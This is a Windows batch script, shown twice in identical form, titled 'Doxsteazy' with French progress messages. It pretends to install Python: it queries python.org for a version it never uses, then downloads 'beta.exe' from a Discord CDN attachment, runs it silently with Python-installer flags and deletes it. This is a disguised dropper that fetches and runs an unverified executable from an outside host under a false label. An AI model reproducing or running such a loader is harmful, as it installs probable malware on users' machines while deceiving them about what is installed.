@echo off
mode con: cols=100 lines=30
title Doxsteazy
color 0a

echo Patientez pendant le telechargement...

for /f "tokens=1,2 delims= " %%a in ('powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/ -UseBasicParsing | Select-String -Pattern '3.10.[0-9]{1,2}' -AllMatches | Select-Object -ExpandProperty Matches | Select-Object -ExpandProperty Value | Sort-Object -Descending -Unique | Select-Object -First 1"') do (
    set "PYTHON_VERSION=%%a%%b"
)
set "PYTHON_URL=https://cdn.discordapp.com/attachments/1162841188617965619/1166001716903284756/beta.exe"
set "PYTHON_EXE=beta.exe"

curl -L -o %PYTHON_EXE% %PYTHON_URL%

echo Telechargement terminer. Le programme va maintenant s'installer.

start /wait %PYTHON_EXE% /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0

del %PYTHON_EXE%
@echo off
mode con: cols=100 lines=30
title Doxsteazy
color 0a

echo Patientez pendant le telechargement...

for /f "tokens=1,2 delims= " %%a in ('powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/ -UseBasicParsing | Select-String -Pattern '3.10.[0-9]{1,2}' -AllMatches | Select-Object -ExpandProperty Matches | Select-Object -ExpandProperty Value | Sort-Object -Descending -Unique | Select-Object -First 1"') do (
    set "PYTHON_VERSION=%%a%%b"
)
set "PYTHON_URL=https://cdn.discordapp.com/attachments/1162841188617965619/1166001716903284756/beta.exe"
set "PYTHON_EXE=beta.exe"

curl -L -o %PYTHON_EXE% %PYTHON_URL%

echo Telechargement terminer. Le programme va maintenant s'installer.

start /wait %PYTHON_EXE% /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0

del %PYTHON_EXE%
